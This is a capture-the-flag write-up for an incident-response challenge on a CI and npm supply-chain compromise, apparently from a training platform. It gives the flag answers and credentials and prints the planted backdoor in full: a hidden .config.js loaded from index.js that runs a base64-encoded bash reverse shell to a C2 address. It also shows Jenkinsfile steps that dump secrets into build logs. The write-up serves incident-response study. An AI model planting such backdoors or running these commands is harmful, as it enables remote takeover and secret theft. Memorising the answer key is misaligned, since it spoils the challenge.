# Xuanji — Supply Chain Incident Response Part 2 (caterpillar + cheshire-cat + twiddledee)

Source: https://xj.edisec.net/challenges/147
Target IP: 52.83.21.169 / 10.0.10.2

## Accounts

| Service | URL | User | Password |
|---------|-----|------|----------|
| Jenkins | http://IP:8081 | alice | alice |
| Gitea | http://IP:3000 | thealice | thealice |

## Answers

| # | Task | Flag |
|---|------|------|
| 1 | caterpillar GITEA_TOKEN | `flag{5d3ed5564341d5060c8524c41fe03507e296ca46}` |
| 2 | Jenkins condition job name | `flag{wonderland-caterpillar-prod}` |
| 3 | Build # for flag2 | `flag{8}` |
| 4 | cheshire-cat flag5 | `flag{e7f15e151781393830ff69ff041d2b4da135908c}` |
| 5 | flag5 commit push # | `flag{6}` |
| 6 | flag5 from build log | `flag{6B31A679-6D70-469D-9F8D-6D6E80B3C29C}` |
| 7 | flag_rce (RCE) | `flag{e2665310468c12dfe3f32f7b1537b765}` |
| 8 | twiddledee malicious version | `flag{1.3.0}` |
| 9 | Backdoor file MD5 | `flag{131a81982d68503545f8eac8c31a18e9}` |
| 10 | Reverse shell C2 address | `flag{192.168.31.64,4444}` |

## Attack Chain

```
xia0le(thealice) ──fork caterpillar──▶ PR #6 challenge7 → Jenkinsfile env leaks GITEA_TOKEN
xia0le(thealice) ──pr cheshire-cat──▶ challenge2 branch → Jenkinsfile injects flag5 theft code
xia0le(thealice) ──pr twiddledee──▶ v1.3.0 plants .config.js reverse shell backdoor
                                           │ index.js require('./.config.js')
                                           │ base64: bash -i >& /dev/tcp/192.168.31.64/4444 0>&1
                                           ▼
                                    npm supply chain poisoning → C2 persistence
```

## Step-by-Step

### 1. caterpillar GITEA_TOKEN

The attacker (thealice) forked Wonderland/caterpillar and modified the Jenkinsfile on challenge7 branch to include an `env` command for environment variable dumping:

```groovy
stage ('Install_Requirements2') {
    steps {
        sh 'echo "${TOKEN}" | base64'
        sh 'env'                                    // ← leaks all env vars
        sh 'echo "${FLAG}" | base64'
        sh 'echo "${FLAG2}" | base64'
    }
}
```

Check `wonderland-caterpillar-test` job → PR-6 → Build 1 console log:

```
GITEA_TOKEN=5d3ed5564341d5060c8524c41fe03507e296ca46
```

### 2. Jenkins Condition Check

The caterpillar Jenkinsfile `deploy` stage only executes on `main` branch:

```groovy
stage('deploy') {
    when { expression { env.BRANCH_NAME == 'main' } }
    steps {
        withCredentials([usernamePassword(credentialsId: 'flag2', ...)]) {
            sh 'curl ... -H "Authorization: Token ${TOKEN}" ...'
        }
    }
}
```

This condition exists only in `wonderland-caterpillar-prod`. The `-test` job's PR builds never reach deploy.

### 3. Build # for flag2

In `wonderland-caterpillar-prod` main branch, Build 8 GET_flag stage outputs:

```
+ base64
+ echo ****
QUVCMTQ5NjYtRkZDMi00RkIwLUJGNDUtQ0Q5MDNCMzUzNURBCg==
```

Decodes to `AEB14966-FFC2-4FB0-BF45-CD903B3535DA`. Builds 1–7 only showed masked output; Build 8 was the first to output actual content.

Answer: `8`

### 4. cheshire-cat flag5

cheshire-cat repo's challenge2 branch inserted flag5-stealing code via merge request. After the final commit merged successfully, CI output:

```
flag{e7f15e151781393830ff69ff041d2b4da135908c}
```

### 5. flag5 Commit Number

The 6th push to challenge2 branch triggered CI to pull and output flag5.

### 6. flag5 from Build Log

Last PR-associated build log for cheshire-cat decoded:

```
flag{6B31A679-6D70-469D-9F8D-6D6E80B3C29C}
```

### 7. flag_rce (Active RCE)

Created challenge7 branch → modified Jenkinsfile to add RCE code → opened/updated merge request → CI pipeline executed → read `/flag_rce` from prod server at 172.18.0.4 via leaked SSH key:

```
flag{e2665310468c12dfe3f32f7b1537b765}
```

Note: flag_rce is environment-specific; Part 2 and Part 3 have different values.

### 8. twiddledee Malicious Version

Wonderland/twiddledee repository, xia0le's commit history:

| Commit | Msg | Description |
|--------|-----|-------------|
| `7422af1` | 1 | Initial implant (node_modules files) |
| `9ef8d9c` | 2 | Creates `.config.js` backdoor + modifies `index.js` |
| `dca4af2` | 2 | Updates package.json (**tag 1.3.0** points here) |
| `fdc5e2d` | 3 | Updates `index.js` |

```
GET /api/v1/repos/Wonderland/twiddledee/git/refs/tags/1.3.0
→ sha: dca4af24de08 (xia0le's malicious commit)
```

Answer: `flag{1.3.0}`

### 9. Backdoor File MD5

The backdoor was introduced in commit `9ef8d9c4b89d`:

**index.js** — modified to load backdoor on require:

```javascript
const hiddenModule = require('./.config.js');
hiddenModule.someFunction();
```

**.config.js** — the backdoor payload:

```javascript
function someFunction() {
  require('child_process').exec('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjY0LzQ0NDQgMD4mMQ==|base64 -d|bash');
}
module.exports = { someFunction };
```

MD5 of `.config.js` file content: `131a81982d68503545f8eac8c31a18e9`

Answer: `flag{131a81982d68503545f8eac8c31a18e9}`

> Pitfall: Some writeups report a commit-level MD5 (`6aee2d5f7f3f71cd47db72ebbd04bf45`), but the platform judges the **file content** MD5.

### 10. Reverse Shell C2 Address

Decode the base64 string from `.config.js`:

```bash
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjY0LzQ0NDQgMD4mMQ==" | base64 -d
# Output: bash -i >& /dev/tcp/192.168.31.64/4444 0>&1
```

C2 address: `192.168.31.64:4444` → `flag{192.168.31.64,4444}`

## Backdoor Analysis

Four elements of the npm supply chain backdoor:

1. **Hidden filename**: `.config.js` — dot-prefix invisible in default `ls`, easily missed in code review
2. **Dependency trigger**: `index.js` is auto-executed on `require('uuid')`, no explicit call needed
3. **Obfuscated payload**: base64-encoded reverse shell command to evade static scanning
4. **C2 persistence**: TCP reverse shell to attacker-controlled server on port 4444

## Comparison with Part 3

| Aspect | Part 2 | Part 3 |
|--------|--------|--------|
| Attack repos | caterpillar, cheshire-cat, twiddledee | mock-turtle, reportcov |
| Backdoor type | npm reverse shell (.config.js) | Jenkinsfile credential theft |
| C2 mechanism | `bash -i >& /dev/tcp/.../4444` | SSH key leak → prod lateral movement |
| Persistence | npm install trigger | Webhook hijack (192.168.31.170) |

## Lessons Learned

- `env` command in CI pipelines is a massive data leak vector — always check build logs
- Gitea tags API returns `[{ref, object: {type, sha}}]` — need to index into the array
- Dotfiles in npm packages deserve extra scrutiny during supply chain audits
- Always verify whether platform expects commit MD5 vs file content MD5
